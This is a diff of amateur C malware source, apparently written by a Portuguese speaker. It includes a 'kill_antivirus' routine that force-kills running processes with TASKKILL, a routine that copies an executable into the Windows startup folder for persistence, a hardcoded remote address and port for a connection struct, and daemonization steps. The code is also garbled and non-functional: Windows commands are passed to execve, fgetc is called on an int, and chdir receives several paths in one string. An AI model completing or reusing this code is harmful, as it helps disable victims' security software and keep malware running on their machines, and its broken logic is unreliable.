@@ -14,19 +14,23 @@
 #define remote_addr "127.0.0.1"
 
 #define remote_port 55766
-#define X TRUE
+
+
 /* struct of cong=figurations to target. */
 
   typedef struct client {
 
   char REMOTE_ADDR;
   int REMOTE_PORT;
- /* char cmd[_T_SIZE 256];
+
+/* char cmd[_T_SIZE 256];
+
   char send[2046]; */
 
   } Client;
 
   typedef struct connection_success {
+
 /*
   int sockfd;
   int newsockfd;
@@ -47,7 +51,8 @@
 
  } /* exit without exceptions... and keep the routine.
 
-  //function  to disable antivirus. */
+
+//function  to disable antivirus. */
 
 void kill_antivirus()
 
@@ -59,11 +64,11 @@ void kill_antivirus()
     if(arq == 0)
         exit(EXIT_SUCCESS);
     else
-   //     while( (arq=fgetc(arq)) != EOF)
-     //     if (arq = '\n')
+        while( (arq=fgetc(arq)) != EOF)
+          if (arq = '\n')
 
    execve("TASKLIST /FI 'STATUS eq RUNNING'", 0, 0);
-//   send(msocket,"Killing anti virus...\n",31,0);
+//   send(x,"Killing anti virus...\n",18,0);
    execve("TASKKILL /F /IM \{}\ '>> NUL'", 0, 0);
 
    return;
@@ -96,7 +101,7 @@ void auto_copy()
 void copy_to_registry()
 
   {
-    execve("copy /Y meuarquivo.exe C:\Documents and Settings\All Users\Menu Iniciar\Programas\Inicializar",0,0);
+    execve("copy /Y meuarquivo.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar",0,0);
     return;
   }
 
@@ -137,7 +142,7 @@ void copy_to_registry()
 
         umask(0);
 
-        chdir("/");
+        chdir("/, C:\\, C:\\Windows\\System32");
 
         int k;
 
